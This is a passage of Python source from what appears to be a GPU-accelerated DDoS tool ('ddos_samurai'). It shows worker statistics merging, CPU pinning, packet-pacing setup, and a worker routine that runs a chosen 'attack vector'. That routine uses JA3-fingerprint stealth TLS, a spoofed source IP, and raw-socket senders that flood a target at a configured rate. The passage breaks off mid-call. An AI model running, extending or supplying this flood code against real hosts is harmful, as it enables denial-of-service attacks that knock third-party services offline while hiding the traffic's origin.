    if item_retry_success_rate > 0.0 or float(acc.get("retry_success_rate", 0.0) or 0.0) == 0.0:
        acc["retry_success_rate"] = item_retry_success_rate
    item_l7_engine_path_used = str(item.get("l7_engine_path_used", "") or "").strip()
    if item_l7_engine_path_used:
        current_l7_engine_path_used = str(acc.get("l7_engine_path_used", "") or "").strip()
        if not current_l7_engine_path_used:
            acc["l7_engine_path_used"] = item_l7_engine_path_used
        elif current_l7_engine_path_used != item_l7_engine_path_used and current_l7_engine_path_used != "mixed":
            acc["l7_engine_path_used"] = "mixed"
    item_l7_fallback_reason = str(item.get("l7_fallback_reason", "") or "").strip()
    if item_l7_fallback_reason:
        current_l7_fallback_reason = str(acc.get("l7_fallback_reason", "") or "").strip()
        if not current_l7_fallback_reason or current_l7_fallback_reason == "none":
            acc["l7_fallback_reason"] = item_l7_fallback_reason
        elif item_l7_fallback_reason != "none" and current_l7_fallback_reason != item_l7_fallback_reason and current_l7_fallback_reason != "mixed":
            acc["l7_fallback_reason"] = "mixed"
    item_l7_capability_status = str(item.get("l7_capability_status", "") or "").strip().lower()
    if item_l7_capability_status in {"ok", "partial", "missing"}:
        current_l7_capability_status = str(acc.get("l7_capability_status", "ok") or "ok").strip().lower()
        if current_l7_capability_status == "missing" or item_l7_capability_status == "missing":
            acc["l7_capability_status"] = "missing"
        elif current_l7_capability_status == "partial" or item_l7_capability_status == "partial":
            acc["l7_capability_status"] = "partial"
        else:
            acc["l7_capability_status"] = "ok"
    acc["h2_goaway_count"] = int(acc.get("h2_goaway_count", 0)) + int(item.get("h2_goaway_count", 0) or 0)
    acc["h2_stream_resets"] = int(acc.get("h2_stream_resets", 0)) + int(item.get("h2_stream_resets", 0) or 0)
    acc["h2_connections_used"] = int(acc.get("h2_connections_used", 0)) + int(item.get("h2_connections_used", 0) or 0)
    acc["h2_request_plan_used"] = max(
        int(acc.get("h2_request_plan_used", 0) or 0),
        int(item.get("h2_request_plan_used", 0) or 0),
    )
    acc["h2_request_plan_items"] = int(acc.get("h2_request_plan_items", 0)) + int(item.get("h2_request_plan_items", 0) or 0)
    item_h2_stream_reset_ratio = float(item.get("h2_stream_reset_ratio", 0.0) or 0.0)
    if item_h2_stream_reset_ratio > 0.0 or float(acc.get("h2_stream_reset_ratio", 0.0) or 0.0) == 0.0:
        acc["h2_stream_reset_ratio"] = item_h2_stream_reset_ratio
    acc["quic_connect_fail_count"] = int(acc.get("quic_connect_fail_count", 0)) + int(item.get("quic_connect_fail_count", 0) or 0)
    acc["quic_connect_timeout_count"] = int(acc.get("quic_connect_timeout_count", 0)) + int(item.get("quic_connect_timeout_count", 0) or 0)
    acc["quic_tls_fail_count"] = int(acc.get("quic_tls_fail_count", 0)) + int(item.get("quic_tls_fail_count", 0) or 0)
    acc["quic_handshake_timeout_count"] = int(acc.get("quic_handshake_timeout_count", 0)) + int(item.get("quic_handshake_timeout_count", 0) or 0)
    acc["quic_stream_fail_count"] = int(acc.get("quic_stream_fail_count", 0)) + int(item.get("quic_stream_fail_count", 0) or 0)
    acc["quic_response_headers_ok_count"] = int(acc.get("quic_response_headers_ok_count", 0)) + int(item.get("quic_response_headers_ok_count", 0) or 0)
    acc["quic_response_body_ok_count"] = int(acc.get("quic_response_body_ok_count", 0)) + int(item.get("quic_response_body_ok_count", 0) or 0)
    acc["quic_response_expected_header_ok_count"] = int(acc.get("quic_response_expected_header_ok_count", 0)) + int(
        item.get("quic_response_expected_header_ok_count", 0) or 0
    )
    acc["quic_response_expected_body_match_ok_count"] = int(acc.get("quic_response_expected_body_match_ok_count", 0)) + int(
        item.get("quic_response_expected_body_match_ok_count", 0) or 0
    )
    acc["quic_response_validation_fail_count"] = int(acc.get("quic_response_validation_fail_count", 0)) + int(item.get("quic_response_validation_fail_count", 0) or 0)
    acc["quic_connection_attempts"] = int(acc.get("quic_connection_attempts", 0)) + int(item.get("quic_connection_attempts", 0) or 0)
    acc["quic_conn_pool_size"] = max(
        int(acc.get("quic_conn_pool_size", 1) or 1),
        int(item.get("quic_conn_pool_size", 1) or 1),
    )
    item_quic_stream_fail_ratio = float(item.get("quic_stream_fail_ratio", 0.0) or 0.0)
    if item_quic_stream_fail_ratio > 0.0 or float(acc.get("quic_stream_fail_ratio", 0.0) or 0.0) == 0.0:
        acc["quic_stream_fail_ratio"] = item_quic_stream_fail_ratio
    item_quic_handshake_fail_ratio = float(item.get("quic_handshake_fail_ratio", 0.0) or 0.0)
    if item_quic_handshake_fail_ratio > 0.0 or float(acc.get("quic_handshake_fail_ratio", 0.0) or 0.0) == 0.0:
        acc["quic_handshake_fail_ratio"] = item_quic_handshake_fail_ratio
    item_quic_response_validation_fail_ratio = float(item.get("quic_response_validation_fail_ratio", 0.0) or 0.0)
    if (
        item_quic_response_validation_fail_ratio > 0.0
        or float(acc.get("quic_response_validation_fail_ratio", 0.0) or 0.0) == 0.0
    ):
        acc["quic_response_validation_fail_ratio"] = item_quic_response_validation_fail_ratio
    item_quic_stack_mode = str(item.get("quic_stack_mode", "") or "").strip()
    if item_quic_stack_mode:
        current_quic_stack_mode = str(acc.get("quic_stack_mode", "") or "").strip()
        if not current_quic_stack_mode:
            acc["quic_stack_mode"] = item_quic_stack_mode
        elif current_quic_stack_mode != item_quic_stack_mode and current_quic_stack_mode != "mixed":
            acc["quic_stack_mode"] = "mixed"
    item_dp_queue_id = int(item.get("dp_queue_id", -1) or -1)
    if item_dp_queue_id >= 0:
        current_dp_queue_id = int(acc.get("dp_queue_id", -1) or -1)
        if current_dp_queue_id < 0:
            acc["dp_queue_id"] = item_dp_queue_id
        elif current_dp_queue_id != item_dp_queue_id:
            acc["dp_queue_id"] = -2
    item_dp_queue_strategy = str(item.get("dp_queue_strategy", "") or "").strip()
    if item_dp_queue_strategy:
        current_dp_queue_strategy = str(acc.get("dp_queue_strategy", "") or "").strip()
        if not current_dp_queue_strategy or current_dp_queue_strategy == "unknown":
            acc["dp_queue_strategy"] = item_dp_queue_strategy
        elif current_dp_queue_strategy != item_dp_queue_strategy and current_dp_queue_strategy != "mixed":
            acc["dp_queue_strategy"] = "mixed"
    item_dp_affinity_cpu = int(item.get("dp_affinity_cpu", -1) or -1)
    if item_dp_affinity_cpu >= 0:
        current_dp_affinity_cpu = int(acc.get("dp_affinity_cpu", -1) or -1)
        if current_dp_affinity_cpu < 0:
            acc["dp_affinity_cpu"] = item_dp_affinity_cpu
        elif current_dp_affinity_cpu != item_dp_affinity_cpu:
            acc["dp_affinity_cpu"] = -2
    _state_active = int(item.get("state_active_entries", 0) or 0)
    if _state_active > 0 or int(acc.get("state_active_entries", 0) or 0) == 0:
        acc["state_active_entries"] = _state_active
    acc["state_timeout_evictions"] = int(acc.get("state_timeout_evictions", 0)) + int(item.get("state_timeout_evictions", 0) or 0)
    acc["state_overwrites"] = int(acc.get("state_overwrites", 0)) + int(item.get("state_overwrites", 0) or 0)
    item_sender_path = str(item.get("sender_path", "") or "").strip()
    if item_sender_path:
        current = str(acc.get("sender_path", "") or "").strip()
        if not current:
            acc["sender_path"] = item_sender_path
        elif current != item_sender_path and current != "MIXED":
            acc["sender_path"] = "MIXED"
    return _recompute_loss_metrics(acc)


def _build_pacing_config(args: dict) -> PacingConfig:
    """Build a PacingConfig from worker args dict (CLI values)."""
    mode = _PACING_MODE_MAP.get(args.get("pacing_mode", "none"), PacingMode.NONE)

    # Auto-promote: if --rps is set but --pacing-mode is "none", use RPS mode
    if mode == PacingMode.NONE and args.get("rps", 0) > 0:
        mode = PacingMode.RPS

    pin_cpu = int(args.get("pin_cpu", -1) or -1)
    if pin_cpu < 0 and str(os.environ.get("SAMURAI_PACING_AUTO_PIN", "1") or "1").strip().lower() not in {
        "0", "false", "no", "off", "disabled"
    }:
        try:
            aff = sorted(int(x) for x in os.sched_getaffinity(0))
            if aff:
                pin_cpu = int(aff[0])
        except Exception:
            pin_cpu = -1

    return PacingConfig(
        pacing_mode   = mode,
        target_rps    = float(args.get("rps", 0)),
        ipg_ns        = int(args.get("ipg", 0)),
        burst_size    = int(args.get("burst_size", 64)),
        burst_gap_ns  = int(args.get("burst_gap", 0)),
        jitter_model  = _JITTER_MODEL_MAP.get(args.get("jitter_model", "none"), JitterModel.NONE),
        jitter_pct    = float(args.get("jitter_pct", 0.0)),
        pin_cpu       = int(pin_cpu),
        use_so_txtime = bool(args.get("use_so_txtime", False)),
    )


def start_worker(
    worker_id,
    args,
    progress=None,
    progress_lock=None,
    tls_profile="none",
    run_events=None,
    sent_total=None,
    errors_total=None,
    resource_stats=None,
):
    """Synchronous entry point for a worker process."""
    # --- CPU Pinning (TRex Style) ---
    cpu_id = -1
    try:
        cpu_count = multiprocessing.cpu_count()
        dp_queue_strategy = str(args.get("dp_queue_strategy", "rr") or "rr").strip().lower()
        dp_queue_id = int(args.get("dp_queue_id", args.get("xdp_queue_id", 0)) or 0)
        # Reserve CPU 0 for OS/Management if possible.
        if cpu_count > 1 and dp_queue_strategy == "pin" and dp_queue_id >= 0:
            cpu_id = min(cpu_count - 1, dp_queue_id + 1)
        elif cpu_count > 1:
            # Round-robin pinning by worker id.
            cpu_id = (worker_id % (cpu_count - 1)) + 1
        else:
            cpu_id = 0

        os.sched_setaffinity(0, {cpu_id})
    except Exception as e:
        print(f"[Worker {worker_id}] Failed to set CPU affinity: {e}")
    args["dp_affinity_cpu"] = int(cpu_id)

    soak_deadline_ts = float(args.get("soak_deadline_ts", 0.0) or 0.0)
    soak_profile = str(args.get("soak_profile", "none") or "none").strip().lower()
    soak_continuous_mode = soak_profile in {"1h", "6h", "24h"}
    if int(args.get("count", 0) or 0) <= 0:
        args["count"] = 1

    def _run_once():
        asyncio.run(
            worker_process(
                worker_id,
                args,
                progress,
                progress_lock,
                tls_profile,
                run_events=run_events,
                sent_total=sent_total,
                errors_total=errors_total,
                resource_stats=resource_stats,
            )
        )

    try:
        if soak_continuous_mode and soak_deadline_ts > 0.0:
            while time.time() < soak_deadline_ts:
                _run_once()
        else:
            _run_once()
    except KeyboardInterrupt:
        pass

async def worker_process(
    worker_id,
    args,
    progress=None,
    progress_lock=None,
    tls_profile="none",
    ssl_context=None,
    run_events=None,
    sent_total=None,
    errors_total=None,
    resource_stats=None,
):
    """
    Worker process target: runs the selected attack vector using senders module.
    """
    # Create SSL context inside the worker if needed (cannot be pickled)
    effective_tls_profile = tls_profile
    if effective_tls_profile == "none":
        effective_tls_profile = args.get("tls_profile", args.get("ja3_profile", "none"))
    if ssl_context is None and effective_tls_profile != "none":
        ssl_context = stealth.create_ja3_context(effective_tls_profile)
    log_info(f"[Worker {worker_id}] süreci başlatıldı (PID: {os.getpid()}). Görev: {args['count']} paket/istek.")
    worker_started = time.time()
    worker_status = "ok"
    worker_error = ""
    backend_used = "cpu"
    worker_stats = _empty_stats()
    _gpu_packet_mod = None
    _gpu_ring_depth_peak = 0
    _gpu_ring_block_wait_ns = 0

    def _update_state_engine_stats():
        return

    fault_inject_set = {
        str(x).strip().lower()
        for x in (args.get("fault_inject", []) or [])
        if str(x).strip()
    }
    if "mix" in fault_inject_set:
        fault_inject_set.update({"sender-restart", "nic-blip", "gpu-stream-error"})
    fault_after_s = float(args.get("fault_after_s", 0) or 0)
    fault_duration_s = max(0.0, float(args.get("fault_duration_s", 2.0) or 0.0))
    fault_done = set()

    def _read_rss_bytes() -> int:
        try:
            with open("/proc/self/statm", "r", encoding="utf-8") as f:
                parts = f.read().strip().split()
            if len(parts) >= 2:
                rss_pages = int(parts[1])
                return int(rss_pages * os.sysconf("SC_PAGE_SIZE"))
        except Exception:
            pass
        return 0

    def _shared_counters_snapshot():
        p_val = 0
        s_val = 0
        e_val = 0
        try:
            if progress_lock is not None:
                with progress_lock:
                    p_val = int(getattr(progress, "value", 0) or 0)
                    s_val = int(getattr(sent_total, "value", 0) or 0)
                    e_val = int(getattr(errors_total, "value", 0) or 0)
            else:
                p_val = int(getattr(progress, "value", 0) or 0)
                s_val = int(getattr(sent_total, "value", 0) or 0)
                e_val = int(getattr(errors_total, "value", 0) or 0)
        except Exception:
            pass
        return p_val, s_val, e_val

    _last_resource_emit = 0.0

    def _update_resource_stats(force: bool = False):
        nonlocal _last_resource_emit
        if resource_stats is None:
            return
        now = time.time()
        if not force and (now - _last_resource_emit) < 5.0:
            return
        _last_resource_emit = now

        vram_used = 0
        vram_total = 0
        pinned_bytes = 0
        pinned_buffers = 0
        gpu_pool_buffers = 0
        gpu_pool_in_use = 0

        if _gpu_packet_mod is not None:
            try:
                gstats = _gpu_packet_mod.get_memory_pool().get_stats()
                vram_used = int(gstats.get("used_bytes", 0) or 0)
                vram_total = int(gstats.get("total_bytes", 0) or 0)
                gpu_pool_buffers = int(gstats.get("buffers_allocated", 0) or 0)
                gpu_pool_in_use = int(gstats.get("buffers_in_use", 0) or 0)
            except Exception:
                pass
            try:
                pstats = _gpu_packet_mod.get_pinned_host_pool().get_stats()
                pinned_bytes = int(pstats.get("total_nbytes", 0) or 0)
                pinned_buffers = int(pstats.get("buffers_allocated", 0) or 0)
            except Exception:
                pass

        p_val, s_val, e_val = _shared_counters_snapshot()
        backlog = max(0, int(p_val) - int(s_val) - int(e_val))
        try:
            resource_stats[int(worker_id)] = {
                "ts": float(now),
                "rss_bytes": int(_read_rss_bytes()),
                "vram_used_bytes": int(vram_used),
                "vram_total_bytes": int(vram_total),
                "pinned_bytes": int(pinned_bytes),
                "pinned_buffers": int(pinned_buffers),
                "gpu_pool_buffers": int(gpu_pool_buffers),
                "gpu_pool_in_use": int(gpu_pool_in_use),
                "backlog": int(backlog),
                "backend": str(backend_used),
                "pacing_actual_rps": float(worker_stats.get("actual_rps", 0.0) or 0.0),
                "pacing_rate_accuracy_pct": float(worker_stats.get("rate_accuracy_pct", 0.0) or 0.0),
                "pacing_jitter_p99_ns": float(worker_stats.get("jitter_p99_ns", 0.0) or 0.0),
                "pacing_ipg_mean_ns": float(worker_stats.get("ipg_mean_ns", 0.0) or 0.0),
                "pacing_sleep_calls": int(worker_stats.get("sleep_calls", 0) or 0),
                "pacing_busywait_cycles": int(worker_stats.get("busywait_cycles", 0) or 0),
                "pacing_so_txtime_active": int(worker_stats.get("so_txtime_active", 0) or 0),
                "pacing_txtime_errors": int(worker_stats.get("txtime_errors", 0) or 0),
            }
        except Exception:
            pass

    _orig_paced_sender = senders.paced_raw_socket_sender
    sender_context_cache = {}
    sender_backend_cfg = str(args.get("sender_backend", "auto") or "auto")
    sender_fallback_policy_cfg = str(args.get("sender_fallback_policy", "allow") or "allow")
    dataplane_core_mode_cfg = str(args.get("dataplane_core_mode", "off") or "off")
    lab_profile_cfg = str(args.get("lab_profile", "off") or "off")
    dp_queue_strategy_cfg = str(args.get("dp_queue_strategy", "rr") or "rr")
    dp_queue_id_cfg = int(args.get("dp_queue_id", args.get("xdp_queue_id", 0)) or 0)
    xdp_enable_cfg = bool(args.get("xdp_enable", False))
    xdp_interface_cfg = str(args.get("xdp_interface", "") or "").strip() or None
    xdp_queue_id_cfg = int(dp_queue_id_cfg)
    worker_stats["dp_queue_id"] = int(dp_queue_id_cfg)
    worker_stats["dp_queue_strategy"] = str(dp_queue_strategy_cfg)
    worker_stats["dp_affinity_cpu"] = int(args.get("dp_affinity_cpu", -1) or -1)
    worker_stats["sender_backend_requested"] = str(sender_backend_cfg)
    worker_stats["sender_fallback_policy"] = str(sender_fallback_policy_cfg)
    worker_stats["dataplane_core_mode"] = str(dataplane_core_mode_cfg)

    try:
        dp_cfg = dataplane.build_dataplane_config(args, queue_id=dp_queue_id_cfg)
        sender_context_cache["dataplane_config"] = dp_cfg.as_dict()
        sender_context_cache["lab_profile"] = str(lab_profile_cfg)
        sender_context_cache["dataplane_hot_path_only"] = bool(dp_cfg.use_core and str(dp_cfg.core_mode or "off") == "required")
        if bool(dp_cfg.use_core):
            dp_session = dataplane.DataplaneSession(dp_cfg)
            sender_context_cache["dataplane_session"] = dp_session
            sender_context_cache["dataplane_opened"] = int(dp_session.open())
            if not sender_context_cache["dataplane_opened"]:
                sender_context_cache["dataplane_open_error"] = str(dp_session.open_error or "dataplane_open_failed")
                if bool(sender_context_cache.get("dataplane_hot_path_only", False)):
                    log_warning(
                        f"[Worker {worker_id}] dataplane core open failed (required mode): {dp_session.open_error or 'unknown'}"
                    )
    except Exception as e:
        log_warning(f"[Worker {worker_id}] dataplane init failed: {e}")

    async def _paced_sender_with_faults(
        *,
        packets_buffer,
        target_ip,
        target_port,
        count,
        verbose,
        pacing_config=None,
        live_sent=None,
        live_errors=None,
        live_progress=None,
        sender_backend=None,
        sender_fallback_policy=None,
        sender_context=None,
        xdp_enable=None,
        xdp_interface=None,
        xdp_queue_id=None,
    ):
        elapsed = max(0.0, time.time() - worker_started)
        can_inject = fault_after_s > 0 and elapsed >= fault_after_s
        if can_inject and "nic-blip" in fault_inject_set and "nic-blip" not in fault_done:
            fault_done.add("nic-blip")
            log_warning(
                f"[Worker {worker_id}] FaultInject NIC blip: {fault_duration_s:.1f}s send pause."
            )
            await asyncio.sleep(fault_duration_s)
        if can_inject and "sender-restart" in fault_inject_set and "sender-restart" not in fault_done:
            fault_done.add("sender-restart")
            log_warning(f"[Worker {worker_id}] FaultInject sender restart simulated.")
            await asyncio.sleep(min(1.0, fault_duration_s))
        if can_inject and "gpu-stream-error" in fault_inject_set and "gpu-stream-error" not in fault_done:
            if args.get("compute_backend") == "cuda":
                fault_done.add("gpu-stream-error")
                log_warning(f"[Worker {worker_id}] FaultInject GPU stream error simulated (one batch drop).")
                _update_resource_stats(force=True)
                return {
                    "attempted": int(count),
                    "sent": 0,
                    "errors": int(count),
                    "bytes_sent_est": 0,
                }

        sender_call_kwargs = {
            "packets_buffer": packets_buffer,
            "target_ip": target_ip,
            "target_port": target_port,
            "count": count,
            "verbose": verbose,
            "pacing_config": pacing_config,
            "live_sent": live_sent,
            "live_errors": live_errors,
            "live_progress": live_progress,
            "sender_backend": sender_backend if sender_backend is not None else sender_backend_cfg,
            "sender_fallback_policy": (
                sender_fallback_policy
                if sender_fallback_policy is not None
                else sender_fallback_policy_cfg
            ),
            "sender_context": sender_context if sender_context is not None else sender_context_cache,
            "xdp_enable": bool(xdp_enable if xdp_enable is not None else xdp_enable_cfg),
            "xdp_interface": xdp_interface if xdp_interface is not None else xdp_interface_cfg,
            "xdp_queue_id": int(xdp_queue_id if xdp_queue_id is not None else xdp_queue_id_cfg),
        }
        try:
            sig_target = _orig_paced_sender
            side_effect = getattr(_orig_paced_sender, "side_effect", None)
            if callable(side_effect):
                sig_target = side_effect
            sig = inspect.signature(sig_target)
            accepts_varkw = any(
                p.kind == inspect.Parameter.VAR_KEYWORD for p in sig.parameters.values()
            )
            if not accepts_varkw:
                sender_call_kwargs = {
                    k: v for k, v in sender_call_kwargs.items() if k in sig.parameters
                }
        except Exception:
            pass

        out = await _orig_paced_sender(**sender_call_kwargs)
        _update_resource_stats(force=False)
        return out

    senders.paced_raw_socket_sender = _paced_sender_with_faults
    _update_resource_stats(force=True)

    _resource_monitor_stop = False

    async def _resource_monitor_loop():
        while not _resource_monitor_stop:
            try:
                _update_resource_stats(force=True)
            except Exception:
                pass
            await asyncio.sleep(5.0)

    _resource_monitor_task = asyncio.create_task(_resource_monitor_loop())

    # Build pacing config from CLI args
    pacing_cfg = _build_pacing_config(args)
    if pacing_cfg.pacing_mode != PacingMode.NONE:
        log_info(f"[Worker {worker_id}] Pacing: mode={pacing_cfg.pacing_mode.name}, "
                 f"rps={pacing_cfg.target_rps:.0f}, ipg={pacing_cfg.ipg_ns}ns, "
                 f"burst={pacing_cfg.burst_size}, jitter={pacing_cfg.jitter_model.name}")
        if PACING_ENGINE_AVAILABLE:
            log_info(f"[Worker {worker_id}] C pacing engine aktif.")
        else:
            log_warning(f"[Worker {worker_id}] C pacing engine yok, Python fallback kullanılacak.")

    try:
        import uvloop
        uvloop.install()
    except Exception:
        pass

    try:
        use_cuda = False
        if args.get('compute_backend') == 'cuda':
            try:
                from numba import cuda as numba_cuda
                if numba_cuda.is_available():
                    use_cuda = True
                else:
                    log_warning("CUDA device not found. Falling back to CPU.")
            except ImportError:
                log_warning("Numba/CUDA module not installed. Falling back to CPU.")
            except Exception as e:
                log_warning(f"CUDA initialization failed: {e}. Falling back to CPU.")

        if use_cuda:
            backend_used = "cuda"
            # LAZY IMPORT for GPU modules
            # NOTE: do not import `senders` here; it shadows the outer module name and
            # breaks CPU paths due to Python's local-variable scoping rules.
            from . import gpu_packet, gpu_payload
            _gpu_packet_mod = gpu_packet
            from .utils import get_gateway_mac, mac_to_int
            # numba_cuda is imported above
            import cupy as cp

            try:
                worker_stats["gpu_packet_backend_name"] = str(
                    getattr(gpu_packet, "get_active_backend_name", lambda: "unknown")()
                )
                worker_stats["gpu_packet_native_enabled"] = int(
                    bool(getattr(gpu_packet, "is_native_path_enabled", lambda: False)())
                )
                worker_stats["gpu_packet_native_library_available"] = int(
                    bool(getattr(gpu_packet, "is_native_library_available", lambda: False)())
                )
                worker_stats["gpu_packet_native_active"] = int(
                    bool(getattr(gpu_packet, "is_native_path_active", lambda: False)())
                )
                worker_stats["gpu_packet_native_policy"] = str(
                    getattr(gpu_packet, "get_native_policy", lambda: "allow")()
                )
                _gpu_native_policy_require = bool(
                    getattr(gpu_packet, "is_native_policy_require", lambda: False)()
                )
            except Exception:
                _gpu_native_policy_require = False
                pass

            if _gpu_native_policy_require and int(worker_stats.get("gpu_packet_native_active", 0) or 0) != 1:
                raise RuntimeError(
                    "GPU native policy=require but native path is not active. "
                    "Set CUDA backend/native env and disable stream fallback."
                )

            def _gpu_to_host(gpu_arr, key: str, stream=None, blocking: bool = True):
                """Copy GPU array to host via shared pinned-memory pool."""
                if isinstance(gpu_arr, memoryview):
                    return gpu_arr if gpu_arr.itemsize == 1 else gpu_arr.cast("B")
                if isinstance(gpu_arr, (bytes, bytearray)):
                    return gpu_arr
                try:
                    import numpy as _np
                except Exception:
                    _np = None
                if _np is not None and isinstance(gpu_arr, _np.ndarray):
                    return gpu_arr
                pool_key = f"worker{worker_id}:{key}"
                return gpu_packet.copy_gpu_to_host_pinned(
                    gpu_arr,
                    key=pool_key,
                    stream=stream,
                    blocking=blocking,
                )

            async def _await_cuda_event(evt):
                """Async wait for CUDA event without hard CPU blocking."""
                try:
                    while not evt.query():
                        await asyncio.sleep(0)
                except Exception:
                    # Conservative fallback for environments without query()
                    evt.synchronize()

            try:
                gpu_packet.configure_pinned_host_pool(max_mb=int(args.get("gpu_pinned_max_mb", 512) or 512))
            except Exception as e:
                log_warning(f"[Worker {worker_id}] pinned pool configure failed: {e}")

            _gpu_ring_capacity = max(1, int(args.get("gpu_ring_capacity", 3) or 3))
            _gpu_batch_size = max(
                1,
                int(args.get("gpu_batch_size", os.environ.get("SAMURAI_GPU_BATCH", 100000)) or 100000),
            )
            _gpu_stream_count = max(
                2,
                int(args.get("gpu_stream_count", os.environ.get("SAMURAI_GPU_STREAMS", 3)) or 3),
            )
            _gpu_pipeline_depth = max(
                1,
                int(
                    args.get(
                        "gpu_pipeline_depth",
                        os.environ.get("SAMURAI_GPU_PIPELINE_DEPTH", 2),
                    )
                    or 2
                ),
            )
            _gpu_pipeline_depth = min(_gpu_pipeline_depth, _gpu_ring_capacity)
            _gpu_full_variation = bool(args.get("gpu_full_variation", True))
            if _gpu_native_policy_require:
                # Native strict mode forbids fallback; CLI queue/depth/stream knobs stay active.
                log_info(
                    f"[Worker {worker_id}] GPU native strict mode active "
                    f"(streams={_gpu_stream_count}, depth={_gpu_pipeline_depth}, ring={_gpu_ring_capacity})"
                )
            _gpu_ring_depth_peak = 0
            _gpu_ring_block_wait_ns = 0
            worker_stats["gpu_batch_size"] = int(_gpu_batch_size)
            worker_stats["gpu_stream_count"] = int(_gpu_stream_count)
            worker_stats["gpu_pipeline_depth"] = int(_gpu_pipeline_depth)
            worker_stats["gpu_full_variation"] = 1 if _gpu_full_variation else 0

            def _build_stream_ring():
                return [cp.cuda.Stream(non_blocking=True) for _ in range(_gpu_stream_count)]

            def _make_ready_event(stream):
                if stream is None:
                    return None
                evt = cp.cuda.Event()
                evt.record(stream)
                return evt

            _state_engine_ready = False
            _state_engine_mode = str(
                args.get("engine_mode", os.environ.get("SAMURAI_STATE_ENGINE_MODE", "auto")) or "auto"
            ).strip().lower()
            if _state_engine_mode not in {"auto", "required"}:
                _state_engine_mode = "auto"
            _state_engine_required = _state_engine_mode == "required"
            _state_sweep_interval_s = max(
                0.05,
                float(int(args.get("state_sweep_interval_ms", 1000) or 1000)) / 1000.0,
            )
            _last_state_sweep = time.time()

            if getattr(senders, "FAST_SENDER_AVAILABLE", False) and hasattr(senders, "fast_sender"):
                fs = senders.fast_sender
                if hasattr(fs, "configure_state_engine"):
                    try:
                        fs.configure_state_engine(
                            int(args.get("state_table_size", 65536) or 65536),
                            int(args.get("state_lock_count", 256) or 256),
                            int(args.get("state_timeout_sec", 60) or 60),
                        )
                        _state_engine_ready = True
                    except Exception as e:
                        log_warning(f"[Worker {worker_id}] state engine configure failed: {e}")
            elif _state_engine_required:
                log_error(
                    f"[Worker {worker_id}] state engine mode='required' but fast_sender extension is unavailable."
                )
                return

            if _state_engine_required and not _state_engine_ready:
                log_error(
                    f"[Worker {worker_id}] state engine mode='required' and initialization failed; aborting worker."
                )
                return

            def _update_state_engine_stats():
                nonlocal worker_stats
                if not _state_engine_ready:
                    return
                if not getattr(senders, "FAST_SENDER_AVAILABLE", False) or not hasattr(senders, "fast_sender"):
                    return
                fs = senders.fast_sender
                if not hasattr(fs, "get_state_engine_stats"):
                    return
                try:
                    st = fs.get_state_engine_stats() or {}
                    worker_stats["state_active_entries"] = int(st.get("active_entries", 0) or 0)
                    worker_stats["state_timeout_evictions"] = int(st.get("timeout_evictions", 0) or 0)
                    worker_stats["state_overwrites"] = int(st.get("overwrites", 0) or 0)
                except Exception:
                    pass

            def _ingest_state_from_batch(batch, sent_count: int):
                if sent_count <= 0 or not _state_engine_ready:
                    return
                if not getattr(senders, "FAST_SENDER_AVAILABLE", False) or not hasattr(senders, "fast_sender"):
                    return
                fs = senders.fast_sender
                if not hasattr(fs, "ingest_tx_packets"):
                    return
                try:
                    fs.ingest_tx_packets(
                        batch.get("cpu"),
                        int(batch.get("packet_size", 0) or 0),
                        int(sent_count),
                    )
                except Exception:
                    pass

            def _maybe_sweep_state():
                nonlocal _last_state_sweep
                if not _state_engine_ready:
                    return
                now = time.time()
                if (now - _last_state_sweep) < _state_sweep_interval_s:
                    return
                _last_state_sweep = now
                if not getattr(senders, "FAST_SENDER_AVAILABLE", False) or not hasattr(senders, "fast_sender"):
                    return
                fs = senders.fast_sender
                if not hasattr(fs, "sweep_state_table"):
                    return
                try:
                    fs.sweep_state_table(4096)
                except Exception:
                    pass

            async def _enqueue_with_backpressure(ring_q: asyncio.Queue, batch_item: dict):
                nonlocal _gpu_ring_depth_peak, _gpu_ring_block_wait_ns
                was_full = ring_q.full()
                t0 = time.perf_counter_ns() if was_full else 0
                await ring_q.put(batch_item)
                waited_ns = max(0, time.perf_counter_ns() - t0) if was_full else 0
                _gpu_ring_block_wait_ns += waited_ns
                qsz = ring_q.qsize()
                if qsz > _gpu_ring_depth_peak:
                    _gpu_ring_depth_peak = qsz

            async def _consume_one_ring_batch(ring_q: asyncio.Queue, target_port: int, ingest_state: bool = False):
                nonlocal worker_stats
                if ring_q.empty():
                    return
                send_batch = await ring_q.get()
                _evt = send_batch.get("ready_event")
                if _evt is not None:
                    await _await_cuda_event(_evt)
                send_stats = await senders.paced_raw_socket_sender(
                    packets_buffer=send_batch["cpu"],
                    target_ip=args['target'],
                    target_port=target_port,
                    count=send_batch["count"],
                    verbose=args['verbose'],
                    pacing_config=pacing_cfg,
                    live_sent=sent_total,
                    live_errors=errors_total,
                    live_progress=progress,
                )
                worker_stats = _add_stats(worker_stats, send_stats)
                if ingest_state:
                    _ingest_state_from_batch(send_batch, int(send_stats.get("sent", 0) or 0))
                _maybe_sweep_state()

            async def _drain_ring_to_depth(
                ring_q: asyncio.Queue,
                target_port: int,
                *,
                keep_depth: int,
                ingest_state: bool = False,
            ):
                target_depth = max(0, int(keep_depth))
                while ring_q.qsize() > target_depth:
                    await _consume_one_ring_batch(ring_q, target_port, ingest_state=ingest_state)
            
            # Re-import senders as something else if needed, OR relies on top-level import
            # The error is likely because `senders` was imported inside this block in a previous version
            # causing it to be treated as local.
            # We will use the top-level `ddos_samurai.senders` or just `senders` from line 11.
            
            # IP Conversion
            target_ip_int = int(sum([int(x) << (24 - i*8) for i, x in enumerate(args['target'].split('.'))]))
            real_src_ip = args.get('spoof_ip', "192.168.1.100")
            if not real_src_ip: real_src_ip = "192.168.1.100"
            real_src_ip_int = int(sum([int(x) << (24 - i*8) for i, x in enumerate(real_src_ip.split('.'))]))
            traffic_model_sessions = list(args.get("traffic_model_sessions", []) or [])
            traffic_model_mode = str(args.get("traffic_model", "none") or "none").strip().lower()
            traffic_model_enabled = traffic_model_mode != "none" and len(traffic_model_sessions) > 0

            def _iter_model_plans():
                for session_plan in traffic_model_sessions:
                    try:
                        rp = gpu_payload.build_request_plan_from_session_plan(session_plan)
                    except Exception:
                        continue
                    if int(len(getattr(rp, "items", []) or [])) > 0:
                        yield rp
            traffic_model_request_plans = list(_iter_model_plans()) if traffic_model_enabled else []

            if args['attack_vector'] == 'http' and bool(args.get('stateful', False)):
                log_info("Initializing GPU L7 planner + CPU Stateful HTTP engine...")
                verify_ssl = (str(args.get('http_verify', 'true')).lower() != "false")
                BATCH_SIZE = int(_gpu_batch_size)
                remaining = int(args['count'])
                if traffic_model_request_plans:
                    for request_plan in traffic_model_request_plans:
                        batch_count = int(len(request_plan.items))
                        worker_stats = _add_stats(worker_stats, await senders.http_stateful_sender(
                            args['target'], args['port'],
